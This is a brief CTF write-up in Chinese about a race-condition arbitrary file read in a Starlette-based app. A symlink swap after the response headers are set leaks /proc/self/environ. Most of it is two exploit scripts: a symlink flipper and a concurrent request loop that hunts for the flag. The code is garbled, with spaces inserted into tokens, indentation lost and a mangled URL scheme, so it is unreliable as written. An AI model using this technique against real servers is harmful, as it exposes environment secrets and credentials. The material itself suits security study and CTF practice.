---
tags: [条件竞争, 符号链接, 任意文件读取, Starlette, Python, LFI]
---

# Funny lfr

看起来好像可以打个竞争， 先写个正常文件， 然后set_stat_headers之后再替换成到 /proc/xx/ environ 的软链接

这个窗口有一点点小。。。

https://github.com/encode/starlette/blob/master/starlette/responses.py#L343

首先在目标机器上执行下面的脚本不断更改a这个目录的软链接目标：

```
import  os
import  time
timeout  =  0 .5
os .system("mkdir  /tmp/cc")
open("/tmp/cc/environ " , "w ") .write("A "*5000)
while  True :
os .unlink("/tmp/a ")
os .symlink("/proc/self/ " ,  "/tmp/a ")
time .sleep(timeout)
os .unlink("/tmp/a ")
os .symlink("/tmp/cc " ,  "/tmp/a ")
time .sleep(timeout)
```

然后运行下面的脚本竞争

```

import  concurrent .futures
import  urllib .request
from  http.client  import  IncompleteRead

url  =  "http:Ⅱ127.0.0.1:13337/?file=/tmp/a/environ"

def  send_request(url) :
try :
with  urllib .request .urlopen(url)  as  response :
return  response .read() .decode('utf-8 ')
except  IncompleteRead  as  e :
return  e .partial .decode('utf-8 ')

while  True :
with  concurrent .futures .ThreadPoolExecutor(max_workers=30)  as  executor : futures  =  {executor .submit(send_request ,  url)  for  _  in  range(30)}   try :
for  future  in  concurrent .futures .as_completed(futures) : response  =  future .result()
if   'FLAG '  in  response :
print(response)
break
except  Exception  as  e :
print("An  error  occurred :  " ,  e )
finally :
for  future  in  futures :
future .cancel()

if   'FLAG '  in  response :
print(response)
break
```

